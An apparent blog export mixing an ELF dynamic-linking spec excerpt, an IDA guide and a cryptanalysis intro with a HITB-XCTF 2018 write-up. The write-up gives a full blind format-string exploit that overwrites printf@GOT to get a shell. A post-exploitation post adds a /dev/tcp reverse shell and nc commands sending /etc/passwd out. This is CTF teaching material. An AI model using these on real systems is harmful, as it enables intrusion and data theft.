object containing this entry before transferring control to the program. The presence of this entry takes precedence over a directive to use lazy binding for this object when specified through the environment or via dlopen(BA_LIB). DF_STATIC_TLS If set in a shared object or executable, this flag instructs the dynamic linker to reject attempts to load this file dynamically. It indicates that the shared object or executable contains code using a static thread-local storage scheme. Implementations need not support any form of thread-local storage. Shared Object DependenciesWhen the link editor processes an archive library, it extracts library members and copies them into the output object file. These statically linked services are available during execution without involving the dynamic linker. Shared objects also provide services, and the dynamic linker must attach the proper shared object files to the process image for execution. When the dynamic linker creates the memory segments for an object file, the dependencies (recorded inDT_NEEDED entries of the dynamic structure) tell what shared objects are needed to supply the program&#39;s services. By repeatedly connecting referenced shared objects and their dependencies, the dynamic linker builds a complete process image. When resolving symbolic references, the dynamic linker examines the symbol tables with a breadth-first search. That is, it first looks at the symbol table of the executable program itself, then at the symbol tables of the DT_NEEDED entries (in order), and then at the second level DT_NEEDED entries, and so on. Shared object files must be readable by the process; other permissions are not required. Even when a shared object is referenced multiple times in the dependency list, the dynamic linker will connect the object only once to the process. Names in the dependency list are copies either of the DT_SONAME strings or the path names of the shared objects used to build the object file. For example, if the link editor builds an executable file using one shared object with a DT_SONAME entry of lib1 and another shared object library with the path name /usr/lib/lib2, the executable file will contain lib1 and /usr/lib/lib2 in its dependency list. If a shared object name has one or more slash (/) characters anywhere in the name, such as /usr/lib/lib2 or directory/file, the dynamic linker uses that string directly as the path name. If the name has no slashes, such as lib1, three facilities specify shared object path searching. The dynamic array tag DT_RUNPATH gives a string that holds a list of directories, separated by colons (:). For example, the string /home/dir/lib:/home/dir2/lib: tells the dynamic linker to search first the directory /home/dir/lib , then /home/dir2/lib, and then the current directory to find dependencies. The set of directories specified by a given DT_RUNPATH entry is used to find only the immediate dependencies of the executable or shared object containing the DT_RUNPATH entry. That is, it is used only for those dependencies contained in the DT_NEEDED entries of the dynamic structure containing the DT_RUNPATH entry, itself. One object&#39;s DT_RUNPATH entry does not affect the search for any other object&#39;s dependencies. A variable called LD_LIBRARY_PATHin the process environment [see exec(BA_OS)] may hold a list of directories as above, optionally followed by a semicolon (;) and another directory list. The following values would be equivalent to the previous example: 1LD_LIBRARY_PATH=/home/dir/usr/lib:/home/dir2/usr/lib: 1LD_LIBRARY_PATH=/home/dir/usr/lib;/home/dir2/usr/lib: 1LD_LIBRARY_PATH=/home/dir/usr/lib:/home/dir2/usr/lib:; Although some programs (such as the link editor) treat the lists before and after the semicolon differently, the dynamic linker does not. Nevertheless, the dynamic linker accepts the semicolon notation, with the semantics described previously. All LD_LIBRARY_PATH directories are searched before those from DT_RUNPATH. Finally, if the other two groups of directories fail to locate the desired library, the dynamic linker searches the default directories, /usr/lib or such other directories as may be specified by the ABI supplement for a given processor. When the dynamic linker is searching for shared objects, it is not a fatal error if an ELF file with the wrong attributes is encountered in the search. Instead, the dynamic linker shall exhaust the search of all paths before determining that a matching object could not be found. For this determination, the relevant attributes are contained in the following ELF header fields: e_ident[EI_DATA], e_ident[EI_CLASS],e_ident[EI_OSABI], e_ident[EI_ABIVERSION], e_machine, e_type, e_flags and e_version. For security, the dynamic linker ignores LD_LIBRARY_PATH for set-user and set-group ID programs. It does, however, search DT_RUNPATH directories and the default directories. The same restriction may be applied to processes that have more than minimal privileges on systems with installed extended security mechanisms. A fourth search facility, the dynamic array tag DT_RPATH, has been moved to level 2 in the ABI. It provides a colon-separated list of directories to search. Directories specified by DT_RPATH are searched before directories specified by LD_LIBRARY_PATH If both DT_RPATH and DT_RUNPATH entries appear in a single object&#39;s dynamic array, the dynamic linker processes only the DT_RUNPATH entry. Substitution Sequences Within a string provided by dynamic array entries with the DT_NEEDED or DT_RUNPATH tags and in pathnames passed as parameters to the dlopen() routine, a dollar sign ($) introduces a substitution sequence. This sequence consists of the dollar sign immediately followed by either the longest name sequence or a name contained within left and right braces ({) and (}). A name is a sequence of bytes that start with either a letter or an underscore followed by zero or more letters, digits or underscores. If a dollar sign is not immediately followed by a name or a brace-enclosed name, the behavior of the dynamic linker is unspecified. If the name is ”ORIGIN“, then the substitution sequence is replaced by the dynamic linker with the absolute pathname of the directory in which the object containing the substitution sequence originated. Moreover, the pathname will contain no symbolic links or use of ”.&quot; or &quot;..&quot; components. Otherwise (when the name is not &quot;ORIGIN&#39;&#39;) the behavior of the dynamic linker is unspecified. When the dynamic linker loads an object that uses $ORIGIN, it must calculate the pathname of the directory containing the object. Because this calculation can be computationally expensive, implementations may want to avoid the calculation for objects that do not use $ORIGIN. If an object calls dlopen() with a string containing $ORIGIN and does not use $ORIGIN in one if its dynamic array entries, the dynamic linker may not have calculated the pathname for the object until the dlopen() actually occurs. Since the application may have changed its current working directory before the dlopen() call, the calculation may not yield the correct result. To avoid this possibility, an object may signal its intention to reference $ORIGIN by setting the DF_ORIGIN flag. An implementation may reject an attempt to use $ORIGINwithin a dlopen() call from an object that did not set the DF_ORIGIN flag and did not use $ORIGIN within its dynamic array. For security, the dynamic linker does not allow use of $ORIGIN substitution sequences for set-user and set-group ID programs. For such sequences that appear within strings specified by DT_RUNPATH dynamic array entries, the specific search path containing the $ORIGIN sequence is ignored (though other search paths in the same string are processed). $ORIGIN sequences within a DT_NEEDED entry or path passed as a parameter to dlopen() are treated as errors. The same restrictions may be applied to processes that have more than minimal privileges on systems with installed extended security mechanisms. Global Offset Table This section requires processor-specific information. The System V Application Binary Interface supplement for the desired processor describes the details. Procedure Linkage Table This section requires processor-specific information. The System V Application Binary Interface supplement for the desired processor describes the details. Hash Table A hash table of Elf32_Word objects supports symbol table access. The same table layout is used for both the 32-bit and 64-bit file class. Labels appear below to help explain the hash table organization, but they are not part of the specification. Figure 5-12: Symbol Hash Table | nbucket || --------------------------------- || nchain || bucket[0]. . .bucket[nbucket-1] || chain[0]. . .chain[nchain-1] | The bucket array contains nbucket entries, and the chain array contains nchain entries; indexes start at 0. Both bucket and chain hold symbol table indexes. Chain table entries parallel the symbol table. The number of symbol table entries should equal nchain; so symbol table indexes also select chain table entries. A hashing function (shown below) accepts a symbol name and returns a value that may be used to compute a bucket index. Consequently, if the hashing function returns the value x for some name, bucket[x%nbucket] gives an index, y, into both the symbol table and the chain table. If the symbol table entry is not the one desired, chain[y] gives the next symbol table entry with the same hash value. One can follow the chain links until either the selected symbol table entry holds the desired name or the chainentry contains the value STN_UNDEF. Figure 5-13: Hashing Function 12345678910111213unsigned longelf_hash(const unsigned char *name)&#123; unsigned long h = 0, g; while (*name) &#123; h = (h &lt;&lt; 4) + *name++; if (g = h &amp; 0xf0000000) h ^= g &gt;&gt; 24; h &amp;= ~g; &#125; return h;&#125; Initialization and Termination Functions After the dynamic linker has built the process image and performed the relocations, each shared object and the executable file get the opportunity to execute some initialization functions. All shared object initializations happen before the executable file gains control. Before the initialization functions for any object A is called, the initialization functions for any other objects that object A depends on are called. For these purposes, an object A depends on another object B, if B appears in A&#39;s list of needed objects (recorded in the DT_NEEDED entries of the dynamic structure). The order of initialization for circular dependencies is undefined. The initialization of objects occurs by recursing through the needed entries of each object. The initialization functions for an object are invoked after the needed entries for that object have been processed. The order of processing among the entries of a particular list of needed objects is unspecified. Each processor supplement may optionally further restrict the algorithm used to determine the order of initialization. Any such restriction, however, may not conflict with the rules described by this specification. The following example illustrates two of the possible correct orderings which can be generated for the example NEEDED lists. In this example the a.out is dependent on b, d, and e. b is dependent on d and f, while d is dependent on e and g. From this information a dependency graph can be drawn. The above algorithm on initialization will then allow the following specified initialization orderings among others. Figure 5-14: Initialization Ordering Example ​ ​ Similarly, shared objects and executable files may have termination functions, which are executed with the atexit(BA_OS) mechanism after the base process begins its termination sequence. The termination functions for any object A must be called before the termination functions for any other objects that object A depends on. For these purposes, an object A depends on another object B, if B appears in A&#39;s list of needed objects (recorded in the DT_NEEDED entries of the dynamic structure). The order of termination for circular dependencies is undefined. Finally, an executable file may have pre-initialization functions. These functions are executed after the dynamic linker has built the process image and performed relocations but before any shared object initialization functions. Pre-initialization functions are not permitted in shared objects. Complete initialization of system libraries may not have occurred when pre-initializations are executed, so some features of the system may not be available to pre-initialization code. In general, use of pre-initialization code can be considered portable only if it has no dependencies on system libraries. The dynamic linker ensures that it will not execute any initialization, pre-initialization, or termination functions more than once. Shared objects designate their initialization and termination code in one of two ways. First, they may specify the address of a function to execute via the DT_INIT and DT_FINI entries in the dynamic structure, described in &quot;Dynamic Section&#39;&#39; above. Note that the address of a function need not be the same as a pointer to a function as defined by the processor supplement. Shared objects may also (or instead) specify the address and size of an array of function pointers. Each element of this array is a pointer to a function to be executed by the dynamic linker. Each array element is the size of a pointer in the programming model followed by the object containing the array. The address of the array of initialization function pointers is specified by the DT_INIT_ARRAY entry in the dynamic structure. Similarly, the address of the array of pre-initialization functions is specified by DT_PREINIT_ARRAYand the address of the array of termination functions is specified by DT_FINI_ARRAY. The size of each array is specified by the DT_INIT_ARRAYSZ, DT_PREINIT_ARRAYSZ, and DT_FINI_ARRAYSZ entries. The addresses contained in the initialization and termination arrays are function pointers as defined by the processor supplement for each processor. On some architectures, a function pointer may not contain the actual address of the function. The functions pointed to in the arrays specified by DT_INIT_ARRAY and by DT_PREINIT_ARRAY are executed by the dynamic linker in the same order in which their addresses appear in the array; those specified by DT_FINI_ARRAY are executed in reverse order. If an object contains both DT_INIT and DT_INIT_ARRAY entries, the function referenced by the DT_INIT entry is processed before those referenced by the DT_INIT_ARRAY entry for that object. If an object contains both DT_FINI and DT_FINI_ARRAY entries, the functions referenced by the DT_FINI_ARRAY entry are processed before the one referenced by the DT_FINI entry for that object. Although the atexit(BA_OS) termination processing normally will be done, it is not guaranteed to have executed upon process death. In particular, the process will not execute the termination processing if it calls _exit[see exit(BA_OS)] or if the process dies because it received a signal that it neither caught nor ignored. The processor supplement for each processor specifies whether the dynamic linker is responsible for calling the executable file&#39;s initialization function or registering the executable file&#39;s termination function with atexit(BA_OS). Termination functions specified by users via the atexit(BA_OS) mechanism must be executed before any termination functions of shared objects.","tags":[{"name":"编译","slug":"编译","permalink":"http://yoursite.com/tags/编译/"}]},{"title":"blind attack:HITB-XCTF Quals 2018 - babypwn","date":"2018-04-20T14:17:22.000Z","path":"2018/04/20/blind-attack-HITB-XCTF-Quals-2018-babypwn/","text":"From https://fbesnard.com/2018/04/13/HITB-XCTF-Quals-2018-babypwn/ Challenge descriptionnc 47.75.182.113 9999 Challenge resolutionIntroducing ourselvesUsing netcat to connect to the challenge, we are greeted with the following message : 12florent@kali:~# nc 47.75.182.113 9999&lt;NOTHING...&gt; Very talkative server, I appreciate that…Maybe we should introduce ourselves : 123florent@kali:~# nc 47.75.182.113 9999Hello, I&apos;m Florent # My inputHello, I&apos;m Florent # Server&apos;s reply So, it seems that the server is sending our input back to us (or is called Florent as well, which is likely not the case…).At this point, one of the possible vulnerabilities that comes to our mind is a format string vulnerability : 12345florent@kali:~# nc 47.75.182.113 9999Hello, I&apos;m FlorentHello, I&apos;m Florent%p %p %p %p %p # My input(nil) (nil) 0x7f2a89d352f0 0x7f2a8a02f780 0x7f2a8a256700 # Server&apos;s reply By sending %p to the server, it replies to us with an address to which a pointer refers.Unfortunately for us, we don’t have access to the binary or its source code.But here we are : a blind format string vulnerability ! Further knowing the server (or getting our hands dirty)Now it’s time to find a way to grab the flag.I’ve already played with format strings vulnerabilities but never blindly.While looking on the net for information on how I could efficiently leak usable addresses from the binary, I came across a challenge from the 33c3 CTF entitled Eat, Sleep Pwn, Repeat or ESPR (which is also the name of the German team which organized the 33c3 CTF).The situation is pretty much the same and I started looking at write-ups of the challenge.I stumbled across these 2 excellent ressources that I encourage you to take a look at : Write-up from @jay_f0xtr0t: Video from @LiveOverflow: In order to solve the challenge, I used the script from @jay_f0xtr0t (available here) that I adapted a little bit. Below is the explanation of what the different parts of the code do : First, we connect to the challenge (obviously) and set the architecture accordingly.The challenge is a 64-bit binary : our %p inputs reveal addresses like 0x7f2a8a02f780 which start with 0x7f and are 6 bytes long. 1234from pwn import *conn = remote('47.75.182.113', 9999)context.update(arch = 'amd64', os = 'linux') The exec_payload function is the function that exploits the format string vulnerability strictly speaking.We prepend an arbitrary value (_EOF in this case but it could have been something else…) to our payload and the function will parse the server’s response until it reaches our value.We ignore \\n because if the server is using the gets function (or similar) for reading our input, the fact that there is a newline character will cause a weird behaviour : the function will replace \\n with \\x00 (null byte) and we will get the output twice. 1234567def exec_payload(payload): if '\\n' in payload: return \"\" conn.sendline(\"_EOF\" + payload) conn.recvuntil(\"_EOF\") data = conn.recv() return data The find_elf function attempts to find an address that might be in the ELF binary.To do so, it looks for an address starting with 0x400 (because 0x400000 is the default base address for binaries).The address that we find will be useful later when we will use the DynELF function from PwnTools. 1234567def find_elf(depth): log.info('Finding ELF. This might take a few seconds...') for i in xrange(1, depth + 1): data = exec_payload('%' + str(i) + '$p') if (len(data) == 8 and data[0:5] == '0x400'): log.success('FOUND ELF !') return int(data, 16) The find_leak_point function attempts to find the correct offset so that our input refers to itself and is sent back to us. 123456def find_leak_point(): log.info('Finding leak point') for i in xrange(1, 200): r = exec_payload('%' + str(i) + '$p' + 'AAAAAAAA' + 'BBBBBBBB') if '0x4242424242424242' in r: # chr(0x42) = 'B' return i The leak function leaks data from the address given as argument.Some workarounds were made by the initial creator to handle the case of the special \\n that we previously mentionned. 12345678910def leak(addr): addr &amp;= (2**64 - 1) r = exec_payload('%' + str(leak_point) + '$s' + 'XXXXXXXX' + p64(addr)) if r == '': return '' r = r[:r.index('XXXXXXXX')] if r == '(null)': return '\\x00' else: return r + '\\x00' Now using DynELF from PwnTools, we can find the addresses of the printf and systemfunctions.The idea behind this is to overwrite the printf address from the Global Offset Table (GOT) with the one from system.By doing so, when the server will attempt to reply to our request, it will use the system function instead of the printf function and thus execute the payload we send. 1234d = DynELF(leak, start_address_elf)dynamic_addr = d.dynamicprintf_addr = d.lookup('printf', 'libc')system_addr = d.lookup('system', 'libc') The find_plt_got function attempts to find the address of the GOT inside the Procedure Linkage Table (PLT).Indeed, the addresses for the printf and system functions we found before are in reality jumps to other addresses.So if we find the GOT, we will be able to have the real address of the printffunction from the GOT.If you don’t get this point, you may want to take a look at this video from @LiveOverflow. 12345678910111213141516def find_plt_got(): addr = dynamic_addr while True: x = d.leak.n(addr, 2) if x == '\\x03\\x00': # PLT/GOT addr += 8 return u64(d.leak.n(addr, 8)) addr += 0x10def find_printf(): addr = got_addr while True: x = d.leak.n(addr, 8) if x == p64(printf_addr): return addr addr += 8 The forge_exploit function generates the final payload to be send to the server, replacing the value at the given address by the one we choose. 123456789101112131415161718def forge_exploit(addr, val): ret = '' curout = 4 dist_to_addr = 12 + 8*20 reader = (dist_to_addr / 8) + 7 for i in range(8): diff = (val &amp; 0xff) - curout curout = (val &amp; 0xff) val /= 0x100 if diff &lt; 20: diff += 0x100 ret += '%0' + str(diff) + 'u' ret += '%' + str(reader) + '$hhn' reader += 1 ret += 'A'*(dist_to_addr - len(ret)) for i in range(8): ret += p64(addr + i) return ret Below is the full exploit code : 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106#!/usr/bin/pythonfrom pwn import *conn = remote('47.75.182.113', 9999)context.update(arch = 'amd64', os = 'linux')DEPTH = 100def exec_payload(payload): if '\\n' in payload: return \"\" conn.sendline(\"_EOF\" + payload) conn.recvuntil(\"_EOF\") data = conn.recv() return datadef find_elf(depth): log.info('Finding ELF. This might take a few seconds...') for i in xrange(1, depth + 1): data = exec_payload('%' + str(i) + '$p') if (len(data) == 8 and data[0:5] == '0x400'): log.success('FOUND ELF !') return int(data, 16)start_address_elf = find_elf(DEPTH)log.info('Using address %s' % hex(start_address_elf))def find_leak_point(): log.info('Finding leak point') for i in xrange(1, 200): r = exec_payload('%' + str(i) + '$p' + 'AAAAAAAA' + 'BBBBBBBB') if '0x4242424242424242' in r: # chr(0x42) = 'B' return ileak_point = find_leak_point()log.success('FOUND leak point %d' % leak_point)def leak(addr): addr &amp;= (2**64 - 1) r = exec_payload('%' + str(leak_point) + '$s' + 'XXXXXXXX' + p64(addr)) if r == '': return '' r = r[:r.index('XXXXXXXX')] if r == '(null)': return '\\x00' else: return r + '\\x00'd = DynELF(leak, start_address_elf)dynamic_addr = d.dynamicprintf_addr = d.lookup('printf', 'libc')system_addr = d.lookup('system', 'libc')def find_plt_got(): addr = dynamic_addr while True: x = d.leak.n(addr, 2) if x == '\\x03\\x00': # type PLTGOT addr += 8 return u64(d.leak.n(addr, 8)) addr += 0x10got_addr = find_plt_got()log.success('FOUND GOT Address: %s' % hex(got_addr))def find_printf(): addr = got_addr while True: x = d.leak.n(addr, 8) if x == p64(printf_addr): return addr addr += 8printf_got = find_printf()log.success('FOUND printf@GOT : %s' % hex(printf_got))def forge_exploit(addr, val): ret = '' curout = 4 dist_to_addr = 12 + 8*20 reader = (dist_to_addr / 8) + 7 for i in range(8): diff = (val &amp; 0xff) - curout curout = (val &amp; 0xff) val /= 0x100 if diff &lt; 20: diff += 0x100 ret += '%0' + str(diff) + 'u' ret += '%' + str(reader) + '$hhn' reader += 1 ret += 'A'*(dist_to_addr - len(ret)) for i in range(8): ret += p64(addr + i) return retlog.info(\"SENDING PAYLOAD, PEW PEW !!!\")exec_payload(forge_exploit(printf_got, system_addr))conn.sendline('/bin/sh')log.success(\"ENJOY YOUR SHELL :)\")conn.interactive()conn.close() Revealing its secretIt’s now time to run our exploit : 1234567891011121314151617181920212223242526272829303132333435363738394041424344florent@kali:~# python exploit.py[+] Opening connection to 47.75.182.113 on port 9999: Done[*] Finding ELF. This might take a few seconds...[+] FOUND ELF ![*] Using address 0x40076d[*] Finding leak point[+] FOUND leak point 8[!] No ELF provided. Leaking is much faster if you have a copy of the ELF being leaked.[*] PT_DYNAMIC[*] PT_DYNAMIC header = 0x400040[*] PT_DYNAMIC count = 0x9[*] PT_DYNAMIC @ 0x600e20[+] Resolving 'printf' in 'libc.so': 0x7f02b722e168[*] Trying lookup based on Build ID: b5381a457906d279073822a5ceb24c4bfef94ddb[*] Skipping unavialable libc b5381a457906d279073822a5ceb24c4bfef94ddb[*] .gnu.hash/.hash, .strtab and .symtab offsets[*] Found DT_GNU_HASH at 0x7f02b7000c00[*] Found DT_STRTAB at 0x7f02b7000c10[*] Found DT_SYMTAB at 0x7f02b7000c20[*] .gnu.hash parms[*] hash chain index[*] hash chain[*] Found DT_GNU_HASH at 0x7f02b7000c00[*] Found DT_STRTAB at 0x7f02b7000c10[*] Found DT_SYMTAB at 0x7f02b7000c20[*] .gnu.hash parms[*] hash chain index[*] hash chain[+] FOUND GOT Address: 0x601000[+] FOUND printf@GOT : 0x601020[*] SENDING PAYLOAD, PEW PEW !!![+] ENJOY YOUR SHELL :)[*] Switching to interactive mode$ lsbabypwnbindevflagliblib32lib64$ cat flagHITB&#123;Baby_Pwn_BabY_bl1nd&#125;","tags":[{"name":"ctf","slug":"ctf","permalink":"http://yoursite.com/tags/ctf/"},{"name":"format string","slug":"format-string","permalink":"http://yoursite.com/tags/format-string/"}]},{"title":"shell之后的操作","date":"2018-04-09T16:00:26.000Z","path":"2018/04/10/shell之后的操作/","text":"0x00 前言一般拿到shell之后能干什么？当然是反弹shell，然后进行一波扫操作了！但是你做题的时候，是否会遇到没有反弹shell的指令或者shell本身时长有限制，连上一会就断了！ 0x01 shell首先还是得讲反弹shell和正向连接shell 前面的这篇文章有了很好的讲解 0x02 延时操作若是你上面的操作都不可实现，那么不妨尝试利用下面的指令 timeout指令12timeout 3000 /bin/bashtimeout 3000 /bin/sh timeout是linux上常见指令，当你想长时间连上shell不断开的话，不妨使用此命令。 sleep指令12sleep 3 终端睡眠3秒sleep infinity 终端睡眠无限长事件 0x03 重定向123456789&quot;1&gt;&quot; 通常可以省略成 &quot;&gt;&quot;1&gt;&amp;2 把正确返回值 传递给 2输出通道 ，&amp;2表示2输出通道 2&gt;&amp;1 把错误返回值 传递给1输出通道, 同样&amp;1表示1输出通道. 反弹shell:bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1bash -i 一个交互的bash，并且连上具体ip、port，&gt;&amp; /dev/tcp/HOST/PORT 表示标准输入与标准输出通过这个连接发出0&gt;&amp;1 标准输入通过这个连接读入 反弹shell的官方解释 1234567891011121314151617/dev/fd/fdIf fd is a valid integer, file descriptor fd is duplicated./dev/stdinFile descriptor 0 is duplicated./dev/stdoutFile descriptor 1 is duplicated./dev/stderrFile descriptor 2 is duplicated./dev/tcp/host/portIf host is a valid hostname or Internet address, and port is an integer port number or service name, Bash attempts to open the corresponding TCP socket./dev/udp/host/portIf host is a valid hostname or Internet address, and port is an integer port number or service name, Bash attempts to open the corresponding UDP socket. &quot;>\\&amp;&quot;操作符的含义： 在“&gt;&amp;word”语法中，当word不是数字或“-”字符时，“&gt;&amp;”表示标准输出和标准错误重定向到文件，此时与操作符“&amp;&gt;”功能一样。 在“&gt;&amp;word”语法中，当word是数字或“-”字符时，操作符“&gt;&amp;”表示复制输出文件描述符 &quot;&gt;word&quot; 当word为1的时候， “word&lt;” 当word为0，代表后面的输出转为输入；当word为1或2时，其实含义与&quot;&gt;1&quot;或&quot;&gt;2&quot;一致 仅有代码”bash -i”时输入输出状态 12345678910标准输入、标准输出和标准错误 全部指向shell（此状态定义为状态A） --- +--------+( 0 ) ----&gt;| shell | --- +--------+ --- +--------+( 1 ) ----&gt;| shell | --- +--------+ --- +--------+( 2 ) ----&gt;| shell | --- +--------+ 命令“&gt;&amp; /dev/tcp/host/port”是对标准输出和标准错误的重定向，此时的输入输出状态 1234567891011标准输入指向shell，标准输出和标准错误指向socket连接文件（此状态定义为状态B） --- +--------+( 0 ) ----&gt;| shell | --- +--------+ --- +--------+ +------------------+( 1 ) ----&gt;| shell | -----&gt; |/dev/tcp/host/port| --- +--------+ ---&gt; +------------------+ / --- +--------+ /( 2 ) ----&gt;| shell | / --- +--------+ 因此执行命令“bash -i &gt;&amp; /dev/tcp/host/port”时将标准输出和标准错误进行了重定向,使标准输出和标准错误指向socket连接文件，标准输入指向原有shell不变。 使用命令“bash -i &gt;&amp; /dev/tcp/host/port”还不能反弹shell，因为此时的输入还是指向shell，此时会出现在被控端（执行反弹shell命令的终端）执行命令，在控制端（监听端口的终端）回显得现象。 命令“0&gt;&amp;1”是对文件描述符的拷贝，是将0[标准输入]重定向到了1[标准输出]指向的位置，此时1[标准输出]指向的是socket连接文件，重定向完成后，0[标准输入]也指向了socket连接文件，状态如下 在状态B时，2[标准错误]指向的也是socket连接文件，因此命令”0&gt;&amp;2”与“0&gt;&amp;1”执行完后结果是一样的,所以反弹shell命令可以写成“bash -i &gt;&amp; /dev/tcp/host/port 0&gt;&amp;2” 123456789101112标准输入、标准输出和标准错误全部指向socket连接文件（此状态定义为状态C） --- +--------+( 0 ) ----&gt;| shell |\\ --- +--------+ \\ \\ --- +--------+ ---&gt; +------------------+( 1 ) ----&gt;| shell | -----&gt; |/dev/tcp/host/port| --- +--------+ ---&gt; +------------------+ / --- +--------+ /( 2 ) ----&gt;| shell | / --- +--------+ 命令”bash -i 5\\&lt;>/dev/tcp/host/port 0&gt;&amp;5 1&gt;&amp;5”也可以反弹shell 说明：\\&lt;>代表的是输入输出 1234567891011 --- +--------+( 0 ) ----&gt;| shell |\\ --- +--------+ \\ \\ --- +--------+ ---&gt; --- ------1-----&gt; +------------------+( 1 ) ----&gt;| shell | -----&gt; ( 5 ) |/dev/tcp/host/port| --- +--------+ ---&gt; --- &lt;-----0------ +------------------+ / --- +--------+ /( 2 ) ----&gt;| shell | / --- +--------+ 其他参考文档 https://www.gnu.org/software/bash/manual/html_node/Redirections.html 0x04 下载文件一般linux上或多或少会支持一些命令wget、curl等，当这些命令存在时就可以完成文件的下载。 但是特殊情况下是这些命令都不存在。下面讲一讲其他办法： nc1234567891011121314接受: ip:192.168.228.221 1234 passwd.txt 发送: ip:192.168.228.222 1234 /etc/passwd方法一：接受方nc -l 1234 |tar -zxvf -发送方tar -zcvf - dir |nc 192.168.228.221 1234方法二：接受方nc -l 1234 &gt; passwd.txt发送方nc 192.168.228.221 1234 &lt; /etc/passwd python1import urllib perl一般的虚拟机上都会有 12 ruby12 java12 Lua12 Bash上面重定向讲得十分透彻，所以这儿就可以快速写出对应的bash脚本了(最终屈服了，没写出来，仍然用的反弹的shell) 1234将/usr/bin/curl 转化为16进制值，切片追加传输echo 0x31323334 |xxd -r 1234 1&quot;cat &lt;&lt; EOF &gt; hex2str\\n#!/bin/sh\\nI=0\\nwhile [ \\$I -lt \\$&#123;#1&#125; ];\\ndo\\n echo -en \\&quot;\\\\x\\&quot;\\$&#123;1:\\$I:2&#125;\\n let \\&quot;I += 2\\&quot;\\ndone\\n\\nEOF\\n&quot; 也即： 123456789cat &lt;&lt; EOF &gt; hex2str#!/bin/shI=0while [ $I -lt $&#123;#1&#125; ];do echo -en &quot;\\x&quot;$&#123;1:$I:2&#125; let &quot;I += 2&quot;doneEOF $hex2str 313233 123$","tags":[{"name":"linux","slug":"linux","permalink":"http://yoursite.com/tags/linux/"},{"name":"shell","slug":"shell","permalink":"http://yoursite.com/tags/shell/"}]},{"title":"IDA使用指南","date":"2018-04-08T09:17:36.000Z","path":"2018/04/08/IDA使用指南/","text":"0x01 前言IDA之于逆向人员、PWN手的重要性几乎等同于左右手之于人。所以学好IDA是我们关键的一步。 0x02 基本快捷键2.1 View2.2 Jump Esc jump to previous position Ctrl+Enter jump to next postion 0x03 patch以前逆向的时候，为了将有些部分的jz改为jnz，我们很可能会关闭IDA-gui，在UltraEdit中找到指定位置进行更改。这种操作十分麻烦，而且费时，所以产生了一下的方法！ 在IDA安装目录中，找到cfg/idagui.cfg，更改“ApplyPatches”改为1 1234原来：&quot;ApplyPatches&quot; = 0 // apply patches to input file现在&quot;ApplyPatches&quot; = 1 // apply patches to input file 如果想patch某个代码段，在IDA View窗口将光标指向对应的汇编代码，这时会发现在Hex View窗口 中对应汇编代码的16进制会突出显示。右键选择Edit（或者直接用F2），即可对目标代码进行更改；最后右键选择Apply Changes（或者使用F2） 即可完成更改 patch之后，你可以直接看到patch更改后对应的汇编代码，也能继续调试 3.1 Change byte在Hex View窗口中右键更改 Edit-&gt;Patch Program -&gt;Change byte 3.2 Change word改字节 Edit-&gt;Patch Program -&gt;Change word 3.3 AssembleEdit-&gt;Patch Program -&gt;Assemble 3.4 Apply patches to input fileEdit-&gt;Patch Program -&gt;Apply patches to input file 0x04 Debug4.1 远程调试 IDA 7.0给了很多远程调试器（dbgsrv文件夹下），只需要将与系统程序对应的server放到被调试的文件目录下即可。 运行该server 在IDA中启动对应的远程调试器，选择Debugger-&gt;Process Options，更改Application、Input File、Directory、Parameters、Hostname、Port、Password 4.2 调试快捷键 F7 - step into F8 - step over F9 - start Process F4 - Run to Cursor Ctrl + F7 - Run until Return Ctrl + F2 - Terminate Process 4.3 Debug View如果你调试过程序，你会发现调试窗口其实是一个独立的多窗口环境，这里面有IDA View-RIP，General registers，Hex View，Stack View，Output window，Python输入框 4.3.1 窗口布局建议使用 123&#123; [IDA View-RIP] &#125; &#123; [General registers] [Hex View] [Stack View]&#125;&#123; output window &#125;&#123;Python [ ]&#125; 4.3.2 IDA View-RIP该窗口支持多种显示，其中有静态分析的跳转图(Graph View)，也有汇编文本(Text View) 所有调整都可以通过右键触发","tags":[{"name":"ida","slug":"ida","permalink":"http://yoursite.com/tags/ida/"},{"name":"调试","slug":"调试","permalink":"http://yoursite.com/tags/调试/"}]},{"title":"线性分析法","date":"2018-04-03T11:26:53.000Z","path":"2018/04/03/线性分析法/","text":"0x00 概述线性分析法、差分分析法作为SPN(Substitution Permutation Network)的常用解法，一直让密码学家痴迷。最近也因为0ctf的一些密码学题目，对线性分析法有了一定的了解，并想写篇博客将具体内容详细展示！ 0x01 SPN网络介绍首先我们来看看这个spn网络 每轮都包含3个步骤：substitution（代替）、permutation（置换）、key-mixing（轮密钥加） 1.1 substitution输入4比特，输出4比特。这是一个双射，让集合$0-(2^4-1)$ 与其本身一一对应。 input 0 1 2 3 4 5 6 7 8 9 A B C D E F output E 4 D 1 2 F B 8 3 A 6 C 5 9 0 7 它起到混淆的作用！ 1.2 permutation输入16比特的数，对其各个比特进行置换。 input 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 output 1 5 9 13 2 6 10 14 3 7 11 15 4 8 12 16 其实可以看出，这是对上面4组S盒输出的16个比特进行简单的置换。 这是一个可逆的操作！ 1.3 轮密钥加提到轮密钥加，我们不得不提轮密钥的产生。一般的轮密钥产生都是利用一种具有雪崩效应的算法，根据初始密钥，生成每一轮的密钥！比较少见的是给出一段较长的密钥，直接切割出每轮的密钥。 最好不要出现以下几种密钥： 简单密钥。对于使用的0000....00或者0101..0101类型的密钥，最好不要使用 可通过某一轮的密钥反解出所有密钥。（前提是你知道某一轮的密钥。。。） 轮密钥不要相关。如果轮密钥只是简单的进行了固定的循环左移或右移变换，那么所有的密钥将会有相同数量的1，以及相同距离的1。这都是很危险的。Related-key attack 1.4 解密其实，由于上面的所有变换都是可逆的运算，所以最终都能根据轮密码求解出原文。 0x02 线性分析法简述线性分析法的基本想法是生成一系列大概可用的线性表达式，如： $X_{i_1}\\oplus X_{i_2} ... X_{i_u} \\oplus Y_{j_1} \\oplus Y_{j_2} ... Y_{j_v}=0$ 其中 $X_i$ 表示第i个比特的输入，$Y_j$ 表示第j个比特的输出 其实当我们比较随机的选取这u+v个比特，最终上述表达式成功的概率大概是1/2。 线性分析法基本原理：如果线性表达式成立的概率距离1/2越远，那么越容易使用线性分析法。若线性表达式发生概率为$p_L$， 那么$|p_L-1/2|$越大越好。 